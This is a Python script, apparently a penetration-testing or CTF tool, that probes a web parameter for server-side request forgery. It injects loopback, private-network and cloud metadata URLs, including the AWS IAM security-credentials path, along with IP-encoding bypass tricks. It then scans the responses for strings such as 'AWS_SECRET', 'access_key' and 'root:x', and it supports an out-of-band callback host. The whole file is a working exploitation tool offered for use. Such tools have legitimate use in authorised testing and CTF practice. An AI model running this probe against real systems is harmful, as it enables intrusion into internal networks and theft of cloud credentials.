#!/usr/bin/env python3
"""
SSRF probe - injects common internal endpoint URLs into a target parameter
and checks for responses that suggest successful server-side request forgery.
Requires: requests
"""

import argparse
import sys
import time

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests not installed: pip install requests", file=sys.stderr)
    sys.exit(1)

# ── Target URLs to probe ──────────────────────────────────────────────────────

INTERNAL_TARGETS = [
    # Loopback
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:5000/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",

    # RFC1918 common gateways
    "http://192.168.0.1/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",

    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",

    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",

    # Azure IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",

    # Docker / Kubernetes
    "http://172.17.0.1/",
    "http://kubernetes.default.svc/",
    "http://10.96.0.1/",

    # Bypass variants
    "http://2130706433/",          # 127.0.0.1 as decimal
    "http://0x7f000001/",          # 127.0.0.1 as hex
    "http://127.1/",               # short loopback
    "http://127.000.000.001/",     # padded octets
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",  # IPv4-mapped IPv6
]

INTERESTING_STRINGS = [
    "ami-id", "instance-id", "security-credentials",
    "computeMetadata", "metadata", "hostname",
    "root:x", "127.0.0.1", "internal",
    "AWS_SECRET", "token", "access_key",
]


def check_interesting(body: str) -> list[str]:
    return [s for s in INTERESTING_STRINGS if s.lower() in body.lower()]


def probe(session: requests.Session, target_url: str, param_value: str,
          method: str, base_data: dict, timeout: int) -> dict | None:
    """Inject `param_value` and record the response."""
    try:
        if method == "GET":
            r = session.get(target_url + param_value, timeout=timeout, verify=False,
                            allow_redirects=True)
        else:
            r = session.post(target_url, data={**base_data, "url": param_value},
                             timeout=timeout, verify=False)
        return {"status": r.status_code, "size": len(r.content),
                "body": r.text[:500], "time": r.elapsed.total_seconds()}
    except requests.exceptions.Timeout:
        return {"status": "TIMEOUT", "size": 0, "body": "", "time": timeout}
    except Exception as e:
        return None


def parse_data(s: str) -> dict:
    if not s:
        return {}
    result = {}
    for part in s.split("&"):
        k, _, v = part.partition("=")
        result[k] = v
    return result


def main():
    parser = argparse.ArgumentParser(description="SSRF probe: test a URL parameter for server-side request forgery")
    parser.add_argument("--url",     required=True,
                        help="Target URL with the injectable parameter, e.g. http://target/fetch?url=")
    parser.add_argument("--param",   default="url",
                        help="Parameter name (for POST mode, default: url)")
    parser.add_argument("--method",  default="GET", choices=["GET", "POST"],
                        help="HTTP method (default: GET). For GET, appends value to URL.")
    parser.add_argument("--data",    default="",
                        help="Additional POST data (key=val&key2=val2)")
    parser.add_argument("--targets", help="File with one internal URL per line (adds to built-in list)")
    parser.add_argument("--oob-host", dest="oob",
                        help="Out-of-band host for blind SSRF detection (e.g. your.burp.collaborator)")
    parser.add_argument("--timeout", type=int, default=8,
                        help="Request timeout (default: 8)")
    parser.add_argument("--headers", action="append", default=[], metavar="H:V")
    args = parser.parse_args()

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (CTF-SSRF)"
    for h in args.headers:
        k, _, v = h.partition(":")
        session.headers[k.strip()] = v.strip()

    targets = list(INTERNAL_TARGETS)
    if args.targets:
        with open(args.targets) as f:
            targets += [l.strip() for l in f if l.strip()]
    if args.oob:
        targets += [f"http://{args.oob}/ssrf-probe",
                    f"https://{args.oob}/ssrf-probe"]

    base_data = parse_data(args.data)

    # Baseline: probe a random external URL to determine normal response
    base_resp = probe(session, args.url, "http://example.com/", args.method,
                      base_data, args.timeout)
    baseline_status = base_resp["status"] if base_resp else 200
    baseline_size   = base_resp["size"]   if base_resp else 0

    print(f"[*] Target: {args.url}")
    print(f"[*] Probing {len(targets)} internal endpoints ...")
    print(f"[*] Baseline: status={baseline_status} size={baseline_size}B\n")

    findings = []
    for internal_url in targets:
        resp = probe(session, args.url, internal_url, args.method, base_data, args.timeout)
        if resp is None:
            continue

        status   = resp["status"]
        size     = resp["size"]
        body     = resp["body"]
        hits     = check_interesting(body)
        diff     = abs(size - baseline_size)

        suspicious = (
            status != baseline_status or
            diff > 100 or
            hits or
            (isinstance(status, int) and status not in (400, 404, 403, 500, 0))
        )

        marker = "[+]" if (hits or diff > 200) else "[~]" if suspicious else "[-]"
        print(f"{marker} {internal_url:<55} {status}  {size}B",
              end="")
        if hits:
            print(f"  INTERESTING: {hits}", end="")
        print()

        if suspicious:
            findings.append({"url": internal_url, "status": status,
                              "size": size, "hits": hits})

    print(f"\n[*] {len(findings)} potentially interesting response(s)")
    for f in findings:
        print(f"  {f['status']}  {f['url']}  hits={f['hits']}")


if __name__ == "__main__":
    main()
